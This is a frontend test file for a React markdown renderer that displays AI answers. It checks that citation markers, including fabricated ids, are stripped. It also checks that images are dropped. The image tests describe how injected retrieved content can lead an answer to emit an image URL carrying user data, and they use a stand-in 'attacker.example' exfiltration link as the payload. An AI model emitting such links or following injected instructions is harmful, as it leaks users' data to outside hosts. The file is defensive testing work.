import { render, screen } from "@testing-library/react";
import { describe, expect, it } from "vitest";
import { AnswerMarkdown, stripCiteMarkers } from "./markdown";

const UUID = "3174bc60-028e-4df2-82c7-d9b3a4eb1b11";

describe("stripCiteMarkers", () => {
  it("hides a full marker mid-stream", () => {
    expect(stripCiteMarkers(`Leave is 25 days [c:${UUID}].`)).toBe("Leave is 25 days .");
  });

  it("hides a marker the model wrote without the c: prefix", () => {
    // Seen live 11 Aug 2026, together with CJK brackets.
    expect(stripCiteMarkers(`Rate is 3.75% 【${UUID}】.`)).toBe("Rate is 3.75% .");
  });

  it("hides a fabricated prefixed id that is not hex", () => {
    // Found by the local end-to-end run: `[c:s1]` matched nothing, so it
    // reached the reader verbatim. The prefix is the model's own claim that
    // this is a citation.
    for (const fake of ["[c:s1]", "[c:source-1]", "[c:ref]", "【c:s1】"]) {
      expect(stripCiteMarkers(`Need is high ${fake}.`)).toBe("Need is high .");
    }
  });

  it("leaves short bracketed prose alone", () => {
    // Without the prefix there is nothing to distinguish these from writing.
    for (const prose of ["[42]", "[dead]", "[TBC]", "[c: the note below]"]) {
      expect(stripCiteMarkers(`Section ${prose} continues.`)).toBe(
        `Section ${prose} continues.`
      );
    }
  });

  it("hides the half of a marker that straddles two deltas", () => {
    expect(stripCiteMarkers("Leave is 25 days [c:3174bc")).toBe("Leave is 25 days ");
  });

  it("hides the marker shapes found 15 Aug 2026, matching the API", () => {
    // Uppercase prefix, markdown-escaped brackets, punctuation inside the
    // bracket, and a dressed-up prefix.
    for (const marker of [`[C:${UUID}]`, `\\[c:${UUID}\\]`, `[c:${UUID}.]`, `[Ref c:${UUID}]`]) {
      expect(stripCiteMarkers(`Leave is 25 days ${marker}.`)).toBe("Leave is 25 days .");
    }
  });
});

describe("stripCiteMarkers — several ids in one bracket", () => {
  it("hides a bracket holding a list of fabricated ids", () => {
    // Seen on a live AHF draft, 11 Aug 2026.
    for (const marker of ["[c:p1, c:b1]", "[c:g1, c:g2, c:g3]", "[c:g1, g2]", "【c:p1, c:b1】"]) {
      expect(stripCiteMarkers(`Works are needed ${marker}.`)).toBe("Works are needed .");
    }
  });

  it("hides a bracket holding real ids", () => {
    expect(stripCiteMarkers(`Both [c:${UUID}, c:${UUID}].`)).toBe("Both .");
  });

  it("still leaves prose with spaces inside the brackets", () => {
    expect(stripCiteMarkers("See [c: the note below] for detail.")).toBe(
      "See [c: the note below] for detail."
    );
  });
});

describe("AnswerMarkdown images", () => {
  /** Retrieved content sits in the system prompt, so an answer can be talked
   *  into emitting an image whose URL carries the data it was shown. A remote
   *  <img> is a GET the reader never clicks. */
  const exfil = "https://attacker.example/log?c=alice%40example.com";

  it("drops a markdown image", () => {
    const { container } = render(<AnswerMarkdown content={`Here you go.

![](${exfil})`} />);
    expect(container.querySelector("img")).toBeNull();
    expect(container.innerHTML).not.toContain("attacker.example");
    expect(screen.getByText("Here you go.")).toBeInTheDocument();
  });

  it("drops an image nested in a link, a list and a table cell", () => {
    const content = `[![alt](${exfil})](https://example.com)

- ![alt](${exfil})

| a |
| --- |
| ![alt](${exfil}) |`;
    const { container } = render(<AnswerMarkdown content={content} />);
    expect(container.querySelectorAll("img")).toHaveLength(0);
    expect(container.innerHTML).not.toContain("attacker.example");
  });

  it("escapes a raw <img> tag rather than rendering it", () => {
    // Raw HTML is already inert without rehype-raw — the tag lands as visible
    // text, so nothing is fetched. This pins that it stays so.
    const { container } = render(<AnswerMarkdown content={`<img src="${exfil}">`} />);
    expect(container.querySelector("img")).toBeNull();
    expect(container.innerHTML).toContain("&lt;img");
  });

  it("still renders ordinary links", () => {
    const { container } = render(<AnswerMarkdown content="See [the guide](https://example.com)." />);
    const link = container.querySelector("a");
    expect(link).toHaveAttribute("href", "https://example.com");
    expect(link).toHaveAttribute("rel", "noreferrer noopener");
  });
});
